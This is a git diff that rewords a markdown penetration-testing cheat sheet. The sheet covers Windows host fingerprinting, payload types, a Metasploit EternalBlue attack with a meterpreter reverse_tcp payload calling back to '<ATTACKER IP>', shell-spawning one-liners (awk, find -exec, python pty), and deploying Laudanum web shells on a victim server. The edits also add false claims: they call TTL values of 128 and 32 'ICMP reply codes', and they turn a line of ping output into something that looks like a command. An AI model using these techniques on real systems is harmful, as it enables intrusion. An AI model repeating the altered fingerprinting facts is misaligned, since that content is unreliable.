@@ -185,11 +185,17 @@ The payload in this form would almost certainly be detected by Windows Defender 
 <details>
 <summary><h4>Enumerating Windows & Fingerprinting Methods</h4></summary>  
 
-When utilizing ICMP to determine if the host is up, a typical response from a Windows host will either be 32 or 128. A response of or around 128 is the most common response you will see.  
+When performing ICMP-based host discovery, Windows systems typically respond with one of these ICMP reply codes:
+
+* Code 128: Standard response (most common)
+
+* Code 32: Alternate response variant
+
+These reply codes serve as reliable indicators of an active Windows host when conducting ping sweeps or network reconnaissance.  
 
 **Attack Machine:** Ping target
 ```bash
-PING <TARGET IP> (<TARGET IP>): 56 data bytes
+ping <TARGET IP> (<TARGET IP>): 56 data bytes
 64 bytes from <TARGET IP>: icmp_seq=0 ttl=128 time=102.920 ms
 64 bytes from <TARGET IP>: icmp_seq=1 ttl=128 time=9.164 ms
 64 bytes from <TARGET IP>: icmp_seq=2 ttl=128 time=14.223 ms
@@ -215,22 +221,54 @@ sudo nmap -v <TARGET IP> --script banner.nse
 <details>
 <summary><h4>Payload Types to Consider</h4></summary>
 
-**DLLs:** File used in Microsoft operating systems to provide shared code and data that can be used by many different programs at once. Injecting a malicious DLL or hijacking a vulnerable library on the host can elevate our privileges to SYSTEM and/or bypass User Account Controls.
+**DLLs:** Dynamic Link Libraries (DLLs) are shared resource files in Microsoft Windows that allow multiple programs to access common code and data simultaneously. Attackers can exploit these files by either injecting a malicious DLL or hijacking a vulnerable system library, enabling privilege escalation to SYSTEM level or bypassing User Account Control (UAC) security measures.
 
-**Batch:** Text-based DOS scripts utilized by system administrators to complete multiple tasks through the command-line interpreter.  
+**Batch:** Text-based DOS scripts used by system administrators to automate multiple tasks through the command-line interpreter (CLI).
 
-**VBS:** Lightweight scripting language based on Microsoft's Visual Basic. It is typically used as a client-side scripting language in webservers to enable dynamic web pages. VBS is dated and disabled by most modern web browsers but lives on in the context of Phishing and other attacks aimed at having users perform an action such as enabling the loading of Macros in an excel document or clicking on a cell to have the Windows scripting engine execute a piece of code.
+**VBS:** A lightweight scripting language derived from Microsoft’s Visual Basic. While historically used for client-side web scripting to enable dynamic content, modern browsers have largely deprecated VBS due to security concerns.
 
-**MSI:** When attempting to install a new application, the installer will look for the .msi file to understand all of the components required and how to find them. We can use the Windows Installer by crafting a payload as an .msi file. Once we have it on the host, we can run msiexec to execute our file, which will provide us with further access, such as an elevated reverse shell.
+Primarily observed in:
 
-**Powershell:** It is both a shell environment and scripting language. PowerShell can provide us with a plethora of options when it comes to gaining a shell and execution on a host, among many other steps in our penetration testing process.
+* Phishing campaigns (e.g., malicious macros in Office documents)
+
+* Social engineering attacks (e.g., tricking users to enable script execution)
+
+* Legacy system maintenance (rare edge cases)
+
+> **Security Note:** Execution typically requires explicit user interaction (e.g., enabling macros, clicking embedded objects).
+
+**MSI:** MSI files contain installation instructions and components for Windows applications. Attackers can exploit this system by:
+
+1. Creating malicious MSI packages containing payloads
+
+2. Delivering them to target systems
+
+3. Executing them via the Windows Installer service (msiexec.exe)
+
+This technique can provide:
+
+* Elevated privileges (often SYSTEM-level access)
+
+* Persistent reverse shells
+
+* Bypass of some security controls
+
+**Powershell:** PowerShell serves as both an interactive shell and powerful scripting language, offering extensive capabilities for offensive security operations:
+
+Key Advantages:
+
+* Native Windows integration (no additional dependencies)
+
+* Deep system access (Windows Management Instrumentation, .NET integration)
+
+* Flexible in-memory execution (evades disk-based detection)
 
 </details>
 
 <details>
 <summary><h4>Procedures for Payload Generation, Transfer, and Execution</h4></summary>
 
-* [MSFVenom & Metasploit-Framework](https://github.com/rapid7/metasploit-framework): MSF is an extremely versatile tool for any pentester's toolkit. It serves as a way to enumerate hosts, generate payloads, utilize public and custom exploits, and perform post-exploitation actions once on the host. Think of it as a swiss-army knife.
+* [MSFVenom & Metasploit-Framework](https://github.com/rapid7/metasploit-framework): MSF stands as an indispensable tool for penetration testers, offering exceptional versatility across all stages of security assessments. This comprehensive platform enables professionals to conduct host enumeration, craft customized payloads, deploy both public and private exploits, and execute sophisticated post-exploitation activities.
 
 * [Payloads All The Things](https://github.com/swisskyrepo/PayloadsAllTheThings): Here, you can find many different resources and cheat sheets for payload generation and general methodology.
 
@@ -280,7 +318,7 @@ Expected output
 # [*] Auxiliary module execution completed
 ```
 
-Now, we can see from the check results that our target is likely vulnerable to EternalBlue. Let's set up the exploit and payload now, then give it a shot.
+The vulnerability assessment indicates a high probability of an EternalBlue exploit working against our target. We'll proceed with configuring the exploit module and payload before initiating the attack.
 
 **Attack Machine: Choose & Configure Our Exploit & Payload**
 
@@ -292,8 +330,7 @@ msf6 > set LHOST <ATTACKER IP>
 msf6 > set RHOSTS <TARGET IP>
 ```
 
-Since I have had more luck with the psexec version of this exploit, we will try that one first. Let's choose it and continue the setup.
-This time, we kept it simple and just used a windows/meterpreter/reverse_tcp payload.
+Based on prior success rates with the PsExec variant, we'll prioritize this exploit method for initial execution. For this engagement, we've selected a standard Windows Meterpreter reverse TCP payload to maintain operational simplicity.
 
 **Attack Machine: Execute Our Attack**  
 
@@ -319,8 +356,7 @@ Expected output
 # (Meterpreter 1)(C:\Windows\system32) > 
 ```
 
-Now that we have an open session through Meterpreter, we are presented with the meterpreter > prompt
-If you wish to interact with the host directly, you can also drop into an interactive shell session on the host from Meterpreter.
+With an active Meterpreter session established (indicated by the meterpreter > prompt), we now have multiple interaction options.
 
 **Attack Machine: Verify Our Session**  
 
@@ -468,7 +504,7 @@ python -c 'import pty; pty.spawn("/bin/sh")'
 <details>
 <summary><h3>Spawn a shell</h3></summary>  
 
-There may be times that we land on a system with a limited shell, and Python is not installed. In these cases, it's good to know that we could use several different methods to spawn an interactive shell. 
+When encountering systems with restricted shell access and no Python interpreter, we should be prepared with alternative methods to escalate to an interactive shell. Several reliable techniques exist for this common post-exploitation scenario:
 
 **/bin/sh**
 
@@ -494,7 +530,7 @@ perl: exec "/bin/sh";\
 
 **Ruby**
 
-If the programming language Ruby is present on the system, this command will execute the shell interpreter specified:
+When Ruby is available on a target system, the following command can execute a system shell:
 
 ```bash
 ruby: exec "/bin/sh"
@@ -503,7 +539,7 @@ ruby: exec "/bin/sh"
 
 **Lua**
 
-If the programming language Lua is present on the system, we can use the os.execute method to execute the shell interpreter specified using the full command below:
+When Lua is available on a target system, the os.execute() function can be leveraged to spawn system shells. The most reliable approach uses absolute paths to avoid dependency on environment variables:
 
 ```bash
 lua: os.execute('/bin/sh')
@@ -512,7 +548,7 @@ lua: os.execute('/bin/sh')
 
 **AWK**
 
-AWK is a C-like pattern scanning and processing language present on most UNIX/Linux-based systems, widely used by developers and sysadmins to generate reports. It can also be used to spawn an interactive shell. 
+AWK is a powerful pattern scanning and processing language with C-like syntax, commonly available on UNIX/Linux systems. AWK also provides functionality that can be leveraged to establish interactive shell sessions in security contexts.
 
 ```bash
 awk 'BEGIN {system("/bin/sh")}'
@@ -528,7 +564,7 @@ find / -name nameoffile -exec /bin/awk 'BEGIN {system("/bin/sh")}' \;
 
 **Exec**
 
-This use of the find command uses the execute option (-exec) to initiate the shell interpreter directly. If find can't find the specified file, then no shell will be attained.
+The find command's -exec parameter can directly invoke a shell interpreter, but this method is contingent on locating the specified file - if the search fails, no shell session will be established.
 
 ```bash
 find . -exec /bin/sh \; -quit
@@ -577,23 +613,44 @@ sudo -l
 <details>
 <summary><h1>🌐 Web Shells</h1></summary>  
 
-A web shell is a browser-based shell session we can use to interact with the underlying operating system of a web server. To achieve persistence on a system, in many cases, this is the initial way of gaining remote code execution via a web application, which we can then use to later upgrade to a more interactive reverse shell.
+A web shell provides browser-based command execution on a web server's underlying operating system, frequently serving as the initial persistence mechanism in web application attacks. This foothold often enables subsequent upgrades to fully interactive reverse shells.
 
-During our external penetration tests, we most commonly "get in" (gain a foothold inside the internal network) via web application attacks (file upload attacks, SQL injection, RFI/LFI, command injection, etc.), password spraying (against RDS, VPN portals, Citrix, OWA, and other applications using Active Directory authentication), and social engineering.
+In external penetration testing engagements, the most prevalent initial access vectors include:
 
-Web applications are often the majority of what we see exposed during an external network assessment and often present an enormous attack surface. We may find publicly available file upload forms that let us directly upload a PHP, JSP, or ASP.NET web shell.
+* Web application vulnerabilities (file upload flaws, SQL injection, RFI/LFI, command injection)
+
+* Credential-based attacks against exposed services (RDS, VPN portals, Citrix, OWA) leveraging Active Directory authentication
+
+* Social engineering campaigns
+
+Web applications typically constitute the largest exposed attack surface during external assessments. Common findings include unsecured file upload functionality accepting malicious PHP, JSP, or ASP.NET web shells.
 
 <details>
 <summary><h2>Laudanum</h2></summary>  
 
-Laudanum is a repository of ready-made files that can be used to inject onto a victim and receive back access via a reverse shell, run commands on the victim host right from the browser, and more. The repo includes injectable files for many different web application languages to include asp, aspx, jsp, php, and more.
+Laudanum is a curated collection of pre-built injection files designed for web application penetration testing. This repository provides security professionals with:
+
+**Key Capabilities:**
+
+* Immediate reverse shell establishment
+
+* Browser-based command execution on compromised hosts
+
+* Cross-language support (ASP, ASPX, JSP, PHP, etc.)
+
+**Operational Value:**
+
+* Rapid deployment during security assessments
+
+* Multiple language support for diverse web environments
+
+* Pre-tested payloads reducing setup time
 
 <details>
 <summary><h3>Installation</h3></summary>  
 
-Laudanum is built into Parrot OS and Kali by default. For any other distro, you will likely need to pull a copy down to use.
+**Clone the repository**  
 
-**Clone the repository**
 ```bash
 sudo git clone https://github.com/jbarcia/Web-Shells.git /usr/share/laudanum
 ```
@@ -603,7 +660,13 @@ sudo git clone https://github.com/jbarcia/Web-Shells.git /usr/share/laudanum
 <details>
 <summary><h3>Usage</h3></summary>  
 
-The Laudanum files can be found in the /usr/share/laudanum directory. For most of the files within Laudanum, you can copy them as-is and place them where you need them on the victim to run.
+The Laudanum toolkit is typically pre-installed at the following location:
+
+```bash
+/usr/share/laudanum
+```
+
+For most of the files within Laudanum, you can copy them as-is and place them where you need them on the victim to run.
 
 **Move a Copy for Modification**
 ```bash
